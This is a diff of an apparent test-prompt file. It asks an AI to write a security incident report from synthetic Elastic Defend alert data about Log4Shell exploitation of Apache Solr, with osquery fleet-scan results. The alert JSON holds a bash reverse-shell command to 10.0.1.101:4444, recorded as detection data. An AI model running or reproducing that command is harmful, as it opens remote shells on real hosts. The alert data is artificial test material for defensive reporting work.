@@ -148,12 +148,13 @@ Alert data:
 ### Test 1: Write an incident report
 
 ```
-You are writing an incident report for a security team.
+Write a security incident report using the template in your instructions.
 
-An Elastic Defend alert fired on host "siem-demo-solr-kb". Here is the context:
+SOURCE ALERT DATA:
+{"_id":"test-alert-log4shell-001","@timestamp":"2026-02-16T14:23:01.000Z","kibana.alert.rule.name":"Reverse Shell via Network Connection","kibana.alert.rule.category":"Endpoint Security","kibana.alert.severity":"critical","kibana.alert.workflow_status":"open","host":{"name":"siem-demo-solr-kb","hostname":"siem-demo-solr-kb","ip":["10.0.1.167"],"os":{"name":"Ubuntu","version":"22.04","family":"debian","platform":"ubuntu"}},"agent":{"id":"9f95fcf0-e3e6-4c91-9ebf-0a3516729fdf","name":"siem-demo-solr-kb","type":"endpoint","version":"8.17.0"},"process":{"name":"bash","pid":4821,"executable":"/usr/bin/bash","args":["/bin/bash","-c","bash -i >& /dev/tcp/10.0.1.101/4444 0>&1"],"entity_id":"proc-abc123","parent":{"name":"java","pid":1234,"executable":"/opt/java/zulu8.31.0.1-jdk8.0.181-linux_x64/bin/java","args":["-server","-Xms512m","-Xmx512m","-Dsolr.solr.home=/opt/solr-8.11.0/server/solr","start.jar","--module=http"],"entity_id":"proc-parent-xyz789"}},"file":{"path":"/opt/solr-8.11.0/server/lib/ext/log4j-core-2.14.1.jar","name":"log4j-core-2.14.1.jar"},"network":{"direction":"egress","transport":"tcp"},"destination":{"ip":"10.0.1.101","port":4444},"event":{"action":"exec","category":["process"],"kind":"signal","module":"endpoint","dataset":"endpoint.alerts"}}
 
 VULNERABILITY ANALYSIS:
-The alert indicates exploitation of CVE-2021-44228 (Log4Shell) in Apache Solr 8.11.0 running on JDK 8u181. A Java process (Solr) spawned a bash reverse shell connecting to 10.0.1.101:4444. The presence of log4j-core-2.14.1.jar confirms the host is vulnerable. Log4j-core versions 2.0 through 2.16.0 are affected.
+The alert indicates exploitation of CVE-2021-44228 (Log4Shell) in Apache Solr 8.11.0 running on JDK 8u181. A Java process (Solr) spawned a bash reverse shell connecting to 10.0.1.101:4444. The presence of log4j-core-2.14.1.jar confirms the host is vulnerable. Log4j-core versions 2.0 through 2.16.0 are affected. MITRE ATT&CK: T1190 (Exploit Public-Facing Application), T1059.004 (Unix Shell).
 
 OSQUERY USED:
 SELECT path, filename, directory FROM file WHERE (directory LIKE '/opt/%%' OR directory LIKE '/usr/%%' OR directory LIKE '/var/%%' OR directory LIKE '/home/%%' OR directory LIKE '/srv/%%' OR directory LIKE '/tmp/%%') AND filename LIKE 'log4j-core%'
@@ -164,16 +165,6 @@ Values: [
   ["siem-demo-solr-kb", "/opt/solr-8.11.0/licenses/log4j-core-2.14.1.jar.sha1", "log4j-core-2.14.1.jar.sha1", "/opt/solr-8.11.0/licenses/", "abc123", "2026-02-16T18:43:16.832Z"],
   ["siem-demo-solr-support", "/opt/solr-8.11.0/licenses/log4j-core-2.14.1.jar.sha1", "log4j-core-2.14.1.jar.sha1", "/opt/solr-8.11.0/licenses/", "abc123", "2026-02-16T18:43:16.831Z"]
 ]
-
-Write a structured incident report with these sections:
-1. EXECUTIVE SUMMARY (2-3 sentences)
-2. ALERT DETAILS (host, rule, timestamp, process info)
-3. VULNERABILITY IDENTIFIED (CVE, affected software, versions)
-4. FLEET IMPACT (which hosts are vulnerable based on scan results)
-5. RECOMMENDED ACTIONS (prioritized list)
-6. OSQUERY USED (include the query for reproducibility)
-
-Use plain text, no markdown. Be concise and actionable.
 ```
 
 ---
